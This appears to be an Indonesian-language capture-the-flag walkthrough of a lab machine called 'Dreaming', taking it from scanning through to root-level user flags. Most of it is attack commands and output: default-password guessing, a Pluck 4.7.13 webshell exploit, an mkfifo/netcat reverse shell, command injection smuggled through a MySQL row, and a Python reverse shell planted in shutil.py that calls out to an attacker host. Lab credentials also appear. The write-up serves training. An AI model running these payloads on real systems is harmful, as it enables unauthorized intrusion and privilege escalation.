scan nmap pada IP target

```shell
nmap -A IP-target -oN zcan
...
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Selanjutnya kita dapat buka port 80 di browser, dan hasilnya adalah apache2.
lakukan enumerating menggunakan gobuster

```shell
gobuster dir -u http://IP-target -w /opt/dirbuster/directory-list-2.3-small.txt | tee gobed1
...
...
/app                  (Status: 301) [Size: 310] [--> http://IP-target/app/]
```

jika kita buka link tersebut, maka akan ada direktori `pluck-4.7.13`.
kita bisa melakukan enum lagi pada `http://IP-target/app/pluck-4.7.13`,
namun jika kita buka pada `pluck` itu saja, kita akan dapat melihat `admin`
pada bagian footer website dreaming tersebut, yang mana jika dibuka maka
akan muncul login page.

pada login page, kita dapat coba memberikan beberapa konfigurasi
default untuk password, misalnya

```
admin
admin123
admin12345
password
password123
...
```

dan salah satunya akan berhasil. Setelah berhasil kita dapat mencari
vuln dari `pluck-4.7.13`. Dan kita menemukannya di [exploitdb](https://www.exploit-db.com/exploits/49909)
selanjutnya download exploit tersebut. lalu run exploit dengan cara

```shell
python3 49909.py <IP-target> <port> password /app/pluck-4.7.13
...
...
...
Uploaded Webshell to: http://IP-target:port/app/pluck-4.7.13/files/shell.phar
```

kita dapat langsung mengunjungi link tersebut untuk melihat filenya.
ketika file dibuka, maka akan muncul shell, dari sini kita dapat
melakukan revshell menggunakan `mkfifo` dengan cara

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP-local port >/tmp/f
```

tidak lupa kita juga perlu menyiapkan listener di local

```shell
nc -lvnp port
```

jika command `mkfifo` sebelumnya di run, maka akan ada session baru
yang terbuka pada netcat. selanjutnya kita dapat menggunakan linpeas
untuk melakukan enumerasi vuln pada instance, dengan cara download linpeas
pada local, lalu setup python simple server dan download linpeas yang
ada di locak ke target dengan wget. jika terjadi error saat download
dari local, kita dapat pergi ke `/tmp` dir pada target terlebih dahulu.
jika sudah kita dapat ubah file ke exec dengan `chmod +x linpeas.sh`.
lalu run dengan cara `./linpeas.sh`.

berikut adalah beberapa hasil

```shell
...
╔══════════╣ Users with console
death:x:1001:1001::/home/death:/bin/bash
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
root:x:0:0:root:/root:/bin/bash
...
...
╔══════════╣ Executable files potentially added by user (limit 70)
...
2023-08-25+16:15:36.0122544440 /home/death/getDreams.py
2023-08-07+23:36:32.8119905200 /opt/test.py
2023-07-28+16:20:07.4826775880 /var/www/html/app/pluck-4.7.13/data/settings/pass.php
...
...
╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  2 root   root   4096 Aug 15 12:45 .
drwxr-xr-x 20 root   root   4096 Jul 28 22:35 ..
-rwxrw-r--  1 death  death  1574 Aug 15 12:45 getDreams.py
-rwxr-xr-x  1 lucien lucien  483 Aug  7 23:36 test.py
...
╔══════════╣ Unexpected in root
/kingdom_backup
/swap.img
...
...
╔══════════╣ Searching passwords in history files
...
/home/lucien/.bash_history:mysql -u lucien -plucien42DBPASSWORD
/home/lucien/.bash_history:cat .mysql_history
...
...

```

ketika kita cek `/var/www/html/../../../../pass.php` kita dapat hash value

```
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
```

dan ketika dicek dengan `hashid`

berikut adalah hasilnya setelah crack password

```shell
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86:password
```

selanjutnya, dari file yang ada di `/opt`, kita dapat melihat isinya,
file `test.py` ternyata berisi password dari Lucien, yaitu

```
lucien:HeyLucien#@1999!
```

kita dapat menggunakan creds ini untuk login ke ssh.
jika sudah, kita akan mendapat flag pertama, yaitu
milik Lucien di `lucien_flag.txt`. karena kita sudah terkoneksi
di ssh dengan user lucien, kita dapat melakukan `sudo -l` untuk
mengetahui cmd apa saja yang dapat di run oleh Lucien. selain
itu, kita juga dapat melihat `.bash_history` milik Lucien.
nantinya kita akan menemukan creds lucien untuk mysql, yaitu

```
mysql -u lucien -plucien42DBPASSWORD
```

kita dapat coba login ke mysql, dan disana ada database bernama
`library` yang berisi tabel `dream`.

```sql
mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
```

isi dari tabel `dream` sama dengan jika kita run command

```shell
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

yang mana merupakan command sudo yang dapat dijalankan
oleh user Lucien tanpa perlu password (bisa di cek dengan
`sudo -l`).sebenarnya terdapat dua file `getDreams.py`,
dalam `/home/death` dan `/opt`, Dalam file `getDreams.py`
dalam `/home/death` tidak dapat dilihat, namun `/opt` dapat
dilihat dan terlihat juga bahwa terdapat password dari user
Death, namun dalam kondisi redacted, selain itu ada hal
menarik yaitu terdapat kode yang akan melakukan eksekusi
command yaitu pada

```shell
cat /opt/getDreams.py
...
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
print(shell)
...
```

karena target selanjutnya adalah Death, kita dapat mencari file
yang dimiliki oleh Death dengan cara

```shell
find / -type f -group death 2>/dev/null
```

namun sepertinya untuk saat ini hanya `getDreams.py yang dapat kita gunakan
sehingga kita dapat menambahkan data yang berupa command yang
copy `/bin/bash` ke `/tmp/bash` dengan ditambah SUID bit, dan
karena script `getDreams.py` dirun oleh Death, maka `/tmp/bash`
akan owned by Death, dengan cara, masuk ke mysql creds milik
Lucien, lalu masuk ke database `library`, selanjutnya masukkan
command berikut

```shell
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('blank','$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)');
```

selanjutnya kita dapat run `getDreams.py` dengan cara

```shell
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

setelahnya, kita dapat run bash dengan cara

```shell
/tmp/bash -p
...
bash-5.0$ whoami
death
bash-5.0$ cat /home/death/death_flag.txt
...
```

karena kita sudah menjadi user Death, kita dapat melihat 
isi dari `/home/death/getDreams.py`, dan hasilnya

```shell
# MySQL credentials
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
DB_NAME = "library"
```

selanjutnya kita dapat login ke ssh sebagai Death.

dari section `unexpected in root` dari hasil linpeas
terdapat beberapa file yaitu 

```shell
/kingdom_backup
/swap.img
```

jika kita pergi ke home dir dari user Morpheus, kita
akan mendapat beberapa file, salah satu yang menarik
adalah `restore.py`, dan beruntungnya kita dapat melihat
isi dari file tersebut, yang mana hanya untuk backup isi
dari `kingdom` ke `kingdom`. yang menarik adalah library
yang digunakan di `restore.py` merupakan shutil, dimana
library tersebut dimiliki oleh Death di
`/usr/lib/python3.8/shutil.py`.

kita dapat memberikan script revshell python dengan
seperti berikut pada bagian function `copy2` karena
dalam `restore.py` penggunaan library shutil hanya
untuk memanggil function `copy2` dari library tersebut.

```python
import os
import pty
import socket

...

def copy2(src, dst, *, follow_symlinks=True):
    lhost = "IP-Local"
    lport = PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
```

masukkan script tersebut ke `/usr/lib/python3.8/shutil.py`
pada bagian function `copy2`, jangan lupa ganti lhost dan
lport dengan IP-local dan port.
selanjutnya siapkan nc listener.

dan nantinya kita akan mendapat shell milik Morpheus,
lihat flag pada `morpheus@dreaming:~$ cat morpheus_flag.txt`
